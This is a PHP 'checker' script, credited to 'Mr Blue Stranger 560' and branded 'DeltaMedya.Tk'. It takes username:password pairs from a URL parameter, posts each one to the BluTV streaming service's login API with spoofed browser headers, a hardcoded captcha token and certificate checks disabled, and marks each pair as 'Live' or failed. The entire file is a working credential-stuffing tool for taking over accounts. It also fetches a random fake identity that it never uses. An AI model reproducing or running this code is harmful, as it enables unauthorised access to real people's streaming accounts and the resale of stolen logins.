<?php

error_reporting(0);

function multiexplode($delimiters, $string) {
  $one = str_replace($delimiters, $delimiters[0], $string);
  $two = explode($delimiters[0], $one);
  return $two;
}
$lista = $_GET['lista'];
$user = multiexplode(array(":", "|", ""), $lista)[0];
$pass = multiexplode(array(":", "|", ""), $lista)[1];



function getStr2($string, $start, $end) {
  $str = explode($start, $string);
  $str = explode($end, $str[1]);
  return $str[0];
}
$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
        $name = $matches1[1][0];
        preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
        $last = $matches1[1][0];
        preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
        $email = $matches1[1][0];
        preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
        $street = $matches1[1][0];
        preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
        $city = $matches1[1][0];
        preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
        $state = $matches1[1][0];
        preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
        $phone = $matches1[1][0];
        preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
        $postcode = $matches1[1][0];
        preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
        $email = $matches1[1][0];


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.blutv.com/api/login');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36 OPR/65.0.3467.78',
'Content-Type: text/plain;charset=UTF-8',
'Origin: https://www.blutv.com',
'Referer: https://www.blutv.com/int/giris',
'Connection: keep-alive'
    ));
curl_setopt($ch, CURLOPT_POSTFIELDS, 
  '{"username":"'.$user.'","password":"'.$pass.'","remember":true,"captchaVersion":"v3","captchaToken":"03AGdBq24ZaR7vXptljo6U9SWfhY6FIS7iXyFOYbqduWkS0Ns5cm7TOfe4fAOSuSz0Vf61iNTrOl_nFslvKN1EnaKZs6d0TsJY1MULZRyS7t5b0r-tzlyvQnVeAzmlS6_MZFkjeF5s7Hatbr48McT5_TZzgSL-olb-V9wWdnVwE606a2o5bXCz7I81_F9NLUwN-kxslfz_ydzUMDq2uK9QnnAtoo9fj3yzNBd-XjcO19iznpmVEP-Ldl8BwGGzKLW0Kti6l1VpofnN1T6-JwWZdCUuUPbHG0lxzgTH0F_9ue6AVkAc07oAJGL5K9Il_Jvtj-GCi5TYHVqBnxtzozfhCLJOAGdrBXTVGzY9h-qo8gsbvPiQR-DazyHOb4uZdPDxAioPKe9CLDIzmzQ6cjANrfniyflCL5_BUhEkKwukmnl0yN-Qjl1Zc2NJRNx4dsxZAntEVv2vGKZne9ln3_EWk2guL6HRI1JzhQ"}');
$fcb = curl_exec($ch);
////////////////////////////===[Card Response]

if (strpos($fcb, '"status":200')) {
  echo '<span class="badge badge-success">#Onaylandı</span> '.$user.':'.$pass.' <b> ❤Live❤ ♛DeltaMedya.Tk♛ </b>';
}
 else {
  echo '<span class="badge badge-danger">💀Başarısız💀</span> '.$user.':'.$pass.' <b> 🔴 Hatalı 🔴 ♛DeltaMedya.Tk♛ </b>';
}
curl_close($ch);
ob_flush();

//////////////////////////////////////////////CHECKER MADE BY MR BLUE STRANGER 560
?>